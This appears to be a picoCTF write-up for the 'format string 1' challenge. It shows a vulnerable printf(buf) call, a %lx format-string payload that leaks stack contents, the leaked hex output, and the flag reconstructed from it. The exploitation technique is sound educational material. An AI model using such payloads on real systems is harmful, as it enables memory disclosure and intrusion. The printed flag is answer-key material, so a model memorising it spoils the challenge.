# format string 1

Patrick and Sponge Bob were really happy with those orders you made for them, but now they're curious about the secret menu. Find it, and along the way, maybe you'll find something else of interest! Download the binary [here](https://artifacts.picoctf.net/c_mimas/44/format-string-1). Download the source [here](https://artifacts.picoctf.net/c_mimas/44/format-string-1.c).

Additional details will be available after launching your challenge instance.

-----

From the source code, we have three file existence checks for `secret-menu-item-1.txt`, `flag.txt`, and `secret-menu-item-2.txt`, so we have to create these in our current working directory to proceed.

Looking at the source code, there is a `printf` which repeats user-inputted data, making it vulnerable to format string attacks which expose the state of the stack.

```c
printf("Give me your order and I'll read it back to you:\n");
fflush(stdout);
scanf("%1024s", buf);
printf("Here's your order: ");
printf(buf);
printf("\n");
fflush(stdout);

printf("Bye!\n");
fflush(stdout);
```

As the contents of the three aforementioned files are read in to the stack with `fopen` and `fgets`, we can use `%lx` to pull raw bytes from the stack.

```
Give me your order and I'll read it back to you:
%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx
Here's your order: 402118,0,7aed125d8a00,0,ffb880,a347834,7ffc7eded1f0,7aed123c9e60,7aed125ee4d0,1,7ffc7eded2c0,0,0,7b4654436f636970,355f31346d316e34,3478345f33317937,31655f673431665f,7d383130386531,
Bye!
```

The last 5 hex numbers decode to `{FTCocip5_14m1n44x4_31y71e_g41f_}8108e1` which can be reversed due to endianness to get `1e8018}_f14g_e17y13_4x44n1m41_5picoCTF{`. The flag is therefore:

```
picoCTF{4n1m41_57y13_4x4_f14g_e11e8018}
```